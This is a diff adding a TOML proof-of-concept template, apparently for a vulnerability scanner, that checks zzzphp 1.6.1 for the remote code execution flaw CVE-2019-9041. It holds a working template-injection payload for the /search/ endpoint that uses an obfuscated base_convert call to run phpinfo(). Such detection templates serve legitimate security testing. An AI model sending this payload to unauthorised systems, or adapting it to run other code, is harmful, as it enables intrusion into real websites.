@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "验证 zzzphp 1.6.1 是否存在远程代码执行漏洞。该漏洞位于 inc/zzz_template.php 的 parserIfLabel() 函数中，由于模板标签过滤不严格，攻击者可构造包含 if:array_map 子串的恶意输入执行任意 PHP 代码。本 PoC 通过发送包含 phpinfo() 调用的 payload 到 /search/ 接口，检测响应中是否包含 PHP 版本信息来判断漏洞是否存在。"
+id = "POC-AVE-2019-0211"
+name = "ZZZCMS zzzphp 远程代码执行漏洞 PoC"
+severity = "high"
+tags = ["ave-2019-0211"]
+vuln_id = [
+    "CVE-2019-9041",
+    "AVE-2019-0211",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/search/"
+protocol = "http"
+
+[poc.requests.body]
+content = "keys={if:array_map(base_convert(27440799224,10,32),array(1))}{end if}"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["phpinfo"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["PHP Version"]
